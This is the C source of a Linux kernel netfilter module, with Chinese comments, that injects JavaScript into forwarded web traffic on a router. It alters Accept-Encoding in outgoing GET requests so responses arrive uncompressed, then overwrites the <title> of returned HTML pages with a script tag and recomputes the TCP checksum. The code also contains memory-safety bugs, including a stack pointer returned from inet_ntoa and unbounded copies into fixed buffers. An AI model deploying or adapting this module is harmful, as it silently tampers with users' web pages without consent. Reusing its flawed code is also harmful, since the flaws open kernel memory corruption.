/*
 一个简单的js注入，hash表需定时检测更新，未写。
*/
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/skbuff.h>
#include <linux/init.h>
#include <linux/ip.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <linux/types.h>
#include <linux/list.h>



MODULE_LICENSE("GPL");
MODULE_LICENSE("Dual BSD/GPL");

#define DP(fmt, args...) do{		/* show debug*/	\
		printk("[%s:%d] "fmt, __func__, __LINE__, ## args);	\
}while(0)

#define HBUF_SIZE    1024
#define HTTP_HEAD_ACCEPT "Accept: "
#define HTTP_HEAD_ACCEPT_LENGTH strlen(HTTP_HEAD_ACCEPT)

#define	HTTP_ACCEPT_ENCODING "Accept-Encoding: "
#define HTTP_ACCEPT_ENCODING_LENGTH strlen(HTTP_ACCEPT_ENCODING)



/*
	通用函数返回值定义
*/
typedef enum {
	eRET_MIN = 0,
	eRET_SUCCESS = eRET_MIN,
	eRET_FAILURE,
	eRET_INVALID_ARG,
	eRET_INVALID_STATE,
	eRET_NO_RESOURCE,
	eRET_ALREADY_EXIST,
	eRET_NOT_EXIST,
	eRET_TIMEOUT,
	eRET_MAX,
	/* To use same size of unsigned int */
	eRET_PADDING = ((unsigned int)~0),
} e_ret;
/************************/


#define HTTP_NEED_JS        1
#define CONNTRACK_HASH_SIZE     2048
#define TIMEOUT     30
struct ip_port {
    unsigned int sip;
    unsigned int dip;
    unsigned short sport;
    unsigned short dport;
};

struct tcp_stream {
    unsigned int ip;
    unsigned int port;
};

struct nf_conntrack_info {
    struct hlist_node conn_node;
    struct ip_port conn_info;
    unsigned short status;
    unsigned long uptime;
};

static struct hlist_head *table[CONNTRACK_HASH_SIZE];
static struct kmem_cache *conn_info_cache /*__read_mostly*/;
typedef unsigned char uchar;

static int hash_num = 0;
char *inet_ntoa(/*struct in_addr addr*/unsigned int addr) 
{
    char    result[16];
    uchar   *bytes;
   
    bytes = (uchar*) &addr;
    sprintf(result, "%d.%d.%d.%d", bytes[0], bytes[1], bytes[2], bytes[3]);
    return result;
}

void conn_hash_init(void)
{
    DP("\n");
    int i = 0;
    struct hlist_head *head;
    conn_info_cache = kmem_cache_create("conn_info_cache",
        sizeof(struct nf_conntrack_info),0,0,NULL);
    if(!conn_info_cache){
        DP("kmem_cache_create fail!\n");
        return ;
    }
    head = (struct hlist_head *)table;
    for(i = 0;i < CONNTRACK_HASH_SIZE; i++){
        INIT_HLIST_HEAD(&head[i]);
    }
    DP("conn_hash_init end!\n");
}

void conn_hash_clean(void)
{
    DP("\n");
    struct hlist_head *chain = NULL;
    struct hlist_node *pos, *next;
    struct nf_conntrack_info *node;
    int i = 0;
    for(i = 0;i < CONNTRACK_HASH_SIZE; i++) {
        chain = &table[i];
        hlist_for_each_entry_safe(node,next,chain,conn_node) {
            hlist_del(&node->conn_node);
            kmem_cache_free(conn_info_cache,node);
        }
    }
    DP("conn_hash_clean end!\n");
    return ;
}

struct nf_conntrack_info * conn_alloc_hnode(void)
{
    struct nf_conntrack_info *node = NULL;

    node = kmem_cache_zalloc(conn_info_cache,GFP_ATOMIC);
    if(node == NULL){
        return NULL;
    }
    else {
        INIT_HLIST_NODE(&node->conn_node);
    }
    return node;
}

unsigned int conn_hash_func(struct ip_port ip)
{
    unsigned int ret;
    struct tcp_stream stream;
    stream.ip = ip.sip + ip.dip;
    stream.port = ip.sport + ip.dport;
    ret = jhash(&stream,sizeof(struct tcp_stream),0) % CONNTRACK_HASH_SIZE;
    return ret;
}

void conn_hash_update(void)
{
    struct hlist_head *chain = NULL;
    struct hlist_node *pos, *next;
    struct nf_conntrack_info *node;
    int i = 0;
    for(i = 0;i < CONNTRACK_HASH_SIZE; i++) {
        chain = &table[i];
        hlist_for_each_entry_safe(node,next,chain,conn_node) {
            if(time_after(jiffies,node->uptime + TIMEOUT*HZ)){
                DP("tcp_stream %s:%d->%s:%d time_out\n",inet_ntoa(node->conn_info.sip),node->conn_info.sport,
                    inet_ntoa(node->conn_info.dip),node->conn_info.dport);
                hlist_del(&node->conn_node);
                kmem_cache_free(conn_info_cache,node);
            }
        }
    }
}
int ip_port_equal(const struct ip_port* s, const struct ip_port* d){
	if (s == NULL || d == NULL){
		return -1;
	}

	if (s->sip == d->sip && s->dip == d->dip 
		&& s->sport == d->sport && s->dport == d->dport){
		return 1;
	} else if (s->sip == d->dip && s->dip == d->sip 
		&& s->sport == d->dport && s->dport == d->sport){
		return 0;
	}
	return -1;
}

struct nf_conntrack_info *conn_hash_find_node(struct ip_port ip)
{
    //DP("\n");
    struct hlist_node *pos,*next;
    struct nf_conntrack_info *node;
    unsigned int key;
    key = conn_hash_func(ip);
    struct hlist_head *chain = (struct hlist_head *)&table[key];
    hlist_for_each_entry_safe(node,next,chain,conn_node) {
        if(ip_port_equal(&(node->conn_info),&ip) >= 0){
            return node;
        }
    }
    return NULL;
}
void conn_hash_add(struct ip_port ip)
{
    DP("\n");
    struct nf_conntrack_info *node = NULL;
    unsigned int key;
    key = conn_hash_func(ip);
    node = conn_hash_find_node(ip);
    if(node == NULL){
        node = conn_alloc_hnode();
        if(node == NULL){
            DP("conn_alloc_hnode is null....\n");
            return ;
        }
        node->conn_info = ip;
        node->status = HTTP_NEED_JS;
        node->uptime = jiffies;
        hlist_add_head(&node->conn_node,(struct hlist_head *)&table[key]);
        DP("tcp_stream %s:%d->%s:%d add...\n",inet_ntoa(node->conn_info.sip),node->conn_info.sport,
                    inet_ntoa(node->conn_info.dip),node->conn_info.dport);
        hash_num ++;
        DP("hash_num:%d.\n",hash_num);
    }
    else{
        node->uptime = jiffies;
    }
}

void conn_hash_del(struct nf_conntrack_info *node)
{
    DP("\n");
    
    if(!node){
        DP("node is null....\n");
        return ;
    }
    DP("tcp_stream %s:%d->%s:%d del...\n",inet_ntoa(node->conn_info.sip),node->conn_info.sport,
                    inet_ntoa(node->conn_info.dip),node->conn_info.dport);
    hlist_del(&node->conn_node);
    kmem_cache_free(conn_info_cache,node);
    hash_num --;
    DP("hash_num:%d.\n",hash_num);

}
/*************************/

/*find 'substr' from a fixed-length buffer   
 *('full_data' will be treated as binary data buffer)  
 *return NULL if not found  
 */
static char* memstr(char* full_data, int full_data_len, char* substr)  
{  
    if (full_data == NULL || full_data_len <= 0 || substr == NULL) {  
        return NULL;  
    }  
  
    if (*substr == '\0') {  
        return NULL;  
    }  
  
    int sublen = strlen(substr);  
  
    int i;  
    char* cur = full_data;  
    int last_possible = full_data_len - sublen + 1;  
    for (i = 0; i < last_possible; i++) {  
        if (*cur == *substr) {  
            //assert(full_data_len - i >= sublen);  
            if (memcmp(cur, substr, sublen) == 0) {  
                //found  
                return cur;  
            }  
        }  
        cur++;  
    }  
  
    return NULL;  
}  


/*description : 从字符串中获取关键字段的值
 *input : 
	source: 	源字符串
	source_len:	原数据串长度
	key_name: 	关键值字段名称，用于定位字段在字符串中位置
	key_value:	存放获取到的关键值	OUT
	key_end:	用于标识关键值结束的标记
	value_len:	用于标识key_value缓冲大小
*优化:传入source长度以避免出现未知内存访问
*/
static e_ret get_str_key_value(char *source, int source_len, char *key_name, char *key_value, char *key_end, int value_len)
{
	char *ptr_start = NULL, *ptr_end = NULL;
	int key_name_len = 0, key_end_len = 0, real_value_len = 0;
	e_ret ret = eRET_FAILURE;
	if (NULL == source || NULL == key_value || NULL == key_end)
	{
		ret = eRET_INVALID_ARG;
	}
	else
	{
		if (key_name_len <= source)
		{
			key_name_len = strlen(key_name);

			//用memstr替换strstr来处理非字符串,避免出现未知内存访问
			ptr_start = memstr(source, source_len, key_name);
			//printk("source_len = %d, ptr_start_len = %d\n", source_len ,ptr_start_len);

			if (NULL != ptr_start)
			{
				ptr_start += strlen(key_name);

				ptr_end = memstr(ptr_start, source_len-(ptr_start-source), key_end );
				if (NULL != ptr_end)
				{
					real_value_len = ptr_end - ptr_start;
					memcpy(key_value, ptr_start, 
						real_value_len > (value_len-1)?(value_len-1):real_value_len);
					ret = eRET_SUCCESS;
				}
				else
				{
					ret = eRET_FAILURE;
				}
			}
			else
			{
				ret = eRET_FAILURE;
			}
		}
		else
		{
			ret = eRET_FAILURE;
		}
	}
	return ret;
}


static e_ret get_http_field_value(char *source,int source_len, const char *endchar, char *pattern, char **pvalue, int *value_len)
{
    char *ptr_start = NULL, *ptr_end = NULL;
    int key_name_len = 0;
    e_ret ret = eRET_FAILURE;
    if (NULL == source || NULL == pvalue)
    {
        ret = eRET_INVALID_ARG;
    }
    else
    {
        key_name_len = strlen(pattern);

        //用memstr替换strstr来处理非字符串,避免出现未知内存访问
        ptr_start = memstr(source, source_len, pattern);
        //printk("source_len = %d, ptr_start_len = %d\n", source_len ,ptr_start_len);

        if (NULL != ptr_start)
        {
            ptr_start += strlen(pattern);

            ptr_end = memstr(ptr_start, source_len-(ptr_start-source), endchar );
            if (NULL != ptr_end)
            {
                *value_len = ptr_end - ptr_start;
                *pvalue = ptr_start;
                ret = eRET_SUCCESS;
            }
            else
            {
                ret = eRET_FAILURE;
            }
        }
        else
        {
            ret = eRET_FAILURE;
        }
       
    }
    return ret;

}

static int get_tcp_data_len(struct sk_buff *skb)
{
	struct iphdr *iph;
    struct tcphdr *tcph ;
	int ip_header_len = 0;
	int tcp_header_len = 0;
	int tcp_data_len = 0;
	if (!skb)
	{
		return 0;
	}
	iph = ip_hdr(skb);
	ip_header_len = iph->ihl<<2;
    tcph = (struct tcphdr*)(skb->data + ip_header_len);
	tcp_header_len = tcph->doff<<2;
	tcp_data_len = ntohs(iph->tot_len) - ip_header_len - tcp_header_len;
	//tcp_data_len = ntohs(iph->tot_len) - iph->ihl<<2 - tcph->doff<<2;//这个结果为0,why
	//printk("ntohs(iph->tot_len) = %d	ip_header_len=%d	tcp_header_len= %d	tcp_data_len=%d\n",ntohs(iph->tot_len),ip_header_len,tcp_header_len,tcp_data_len);
	return tcp_data_len;
}

void print_package(char *data, int data_len) 
{
    if(!data) {
        return ;
    }
    int i;
    printk("##########start##########\n");
    printk("data_len = %d.\n",data_len);
    for(i = 0; i < data_len; i++) {
        
        if(i != 0 && i % 16 == 0){
            printk("\n");
        }
        printk("%02x ", (unsigned char)data[i]);
    }
    printk("##########end############\n");
}

void http_js_injection_request(struct sk_buff* skb)
{
    struct tcphdr *tcph = NULL;
    struct iphdr *iph = NULL;
    char *tcp_data = NULL;
    int tcp_data_len = 0,tcp_header_len = 0,ip_len = 0;
    int datalen = 0 ;
    char http_accept[HBUF_SIZE] = "";
    char tmp_buf[512] = "";
    char *pmatch = NULL, *pencode = NULL;
    char *pvalue = NULL;
    int pvalue_len = 0;
    struct ip_port super_ip;
    iph = ip_hdr(skb);
    
    /*
    if ((skb->protocol==htons(ETH_P_8021Q) || skb->protocol==htons(ETH_P_IP)) && skb->len>=sizeof(struct ethhdr)) {
        if (skb->protocol==htons(ETH_P_8021Q)){ 
            iph = (struct iphdr *)((u8*)iph+4);
        }
    }*/
    if(iph->protocol == IPPROTO_TCP) {
        //DP("tcp package come....\n");
        ip_len = ntohs(iph->tot_len);
        tcph = (struct tcphdr *)((unsigned char *)iph + (iph->ihl << 2));
        tcp_data = (char *)tcph + (tcph->doff<<2);
        super_ip.sip = iph->saddr;
        super_ip.sport = ntohs(tcph->source);
        super_ip.dip = iph->daddr;
        super_ip.dport = ntohs(tcph->dest);
        
        if(tcp_data == NULL){
            DP("tcp_data is null...\n");
            goto end;
        }
        if((unsigned long)skb_tail_pointer(skb) < (unsigned long)(tcp_data + 2)){
            //DP("not vail data...\n");
            goto end;
        }
        //DP("tcp_data_len:%d.\n",tcp_data_len);
        if(tcp_data[0]==0x47&&tcp_data[1]==0x45&&tcp_data[2]==0x54) {//http get 
            //DP("http get....\n");
            if(get_http_field_value(tcp_data,get_tcp_data_len(skb),"\r\n","GET /",&pvalue,&pvalue_len) == eRET_SUCCESS){
                memcpy(tmp_buf,pvalue,pvalue_len);
               // DP("pvalue:%s. pvalue_len:%d.\n",tmp_buf,pvalue_len);
            }
            if(get_str_key_value(tcp_data,get_tcp_data_len(skb),"\r\nAccept: ",http_accept,"\r\n",sizeof(http_accept)) == eRET_SUCCESS){
                //DP("http_accept:\n%s.\n",http_accept);
                pmatch = strstr(http_accept,"html");
                if(!pmatch){
                    goto end;
                }
                pencode = strstr(tcp_data,HTTP_ACCEPT_ENCODING);
                if(pencode) {
                    DP("inject GET:\n%s.\n",tmp_buf);
                    conn_hash_add(super_ip);
                    //pencode -= HTTP_ACCEPT_ENCODING_LENGTH;
                    ++ pencode;
                    *pencode = 'B';
                    //DP("accept_encode:%c%c%c%c%c\n",pencode[0],pencode[1],pencode[2],pencode[3],pencode[4]);
                    datalen = skb->len - (iph->ihl<<2);
                    tcph->check = 0;
                    tcph->check = tcp_v4_check(datalen,iph->saddr,iph->daddr,
                        csum_partial((char *)tcph,datalen,0));
                }
            } 
        }
        
    }
end:
    return ;
}

void http_js_injection_response(struct sk_buff* skb)
{
    struct iphdr *iph = NULL;
    struct tcphdr *tcph = NULL;

    struct nf_conntrack_info *node = NULL;
    struct ip_port super_ip;
    char *tcp_data = NULL;
    int tcp_data_len = 0,data_len = 0;
    char injec_buf[64] = "";
    int injec_len = 0;
    char *pinjec_pos = NULL;
    int pinjec_pos_len = 0;
    char tmp_buf[512] = "";
    int insert_flag = 0;
    sprintf(injec_buf,"%s","<script src=flb_js_injection></script>");
    injec_len = strlen(injec_buf);

    iph = ip_hdr(skb);
    tcph = (struct tcphdr *)((unsigned char *)iph + (iph->ihl << 2));
    tcp_data = (char *)tcph + (tcph->doff << 2);
    tcp_data_len = get_tcp_data_len(skb);
    super_ip.sip = iph->saddr;
    super_ip.sport = ntohs(tcph->source);
    super_ip.dip = iph->daddr;
    super_ip.dport= ntohs(tcph->dest);
    
    if(tcp_data_len < 15){
        goto end;
    }
    if(tcp_data[0]==0x48 && tcp_data[1]==0x54 && tcp_data[2]==0x54 && tcp_data[3]==0x50 &&
        tcp_data[13]==0x4f && tcp_data[14]==0x4b)//response http ok
    {
        if((node = conn_hash_find_node(super_ip)) != NULL){
            DP("find the node....\n");
            if(get_http_field_value(tcp_data,tcp_data_len,">","<title>",&pinjec_pos,&pinjec_pos_len) == eRET_SUCCESS){
                pinjec_pos -= strlen("<title>");
                pinjec_pos_len += (strlen("<title>") + 1);
                memcpy(tmp_buf,pinjec_pos,pinjec_pos_len);
                //DP("pinjec location:%s. len:%d.\n",tmp_buf,pinjec_pos_len);
                if(injec_len <= pinjec_pos_len){
                    insert_flag = 1;
                    DP("pinjec location:%s. len:%d.\n",tmp_buf,pinjec_pos_len);
                }
            }
            conn_hash_del(node);
        }
    }
    if(insert_flag){
        DP("js injection success....!\n");
        DP("sport:%d,dport:%d.\n",ntohs(tcph->source),ntohs(tcph->dest));
        memset(pinjec_pos,0x20,pinjec_pos_len);
        memcpy(pinjec_pos,injec_buf,injec_len);
        data_len = skb->len - (iph->ihl*4);
        tcph->check = 0;
        tcph->check = tcp_v4_check(data_len,iph->saddr,iph->daddr,
            csum_partial((char *)tcph,data_len,0));
    }
end:
    return ;
}

static unsigned int http_mangle(unsigned int hooknum, 
                  struct sk_buff* skb, 
                  const struct net_device* in, 
                  const struct net_device* out, 
                  int(*okfn)(struct sk_buff*))
{
    if(memcmp(in->name,"br-lan",6) == 0){
        http_js_injection_request(skb);
    }
    else {
        http_js_injection_response(skb);
    }
    return NF_ACCEPT;
}

static struct nf_hook_ops js_hooks[] = {
    {
        .pf         = NFPROTO_IPV4,
        .priority   = NF_IP_PRI_MANGLE,
        .hooknum    = NF_INET_FORWARD,
        .hook       = http_mangle,
        .owner      = THIS_MODULE,
    }
};

int portal_init(void)
{
    DP("init portal_init....\n");
    conn_hash_init();
    return nf_register_hooks(js_hooks,ARRAY_SIZE(js_hooks));
}

void portal_fini(void)
{
    DP("clean portal_fini....\n");
    conn_hash_clean();
    nf_unregister_hooks(js_hooks,ARRAY_SIZE(js_hooks));
}

module_init(portal_init);
module_exit(portal_fini);

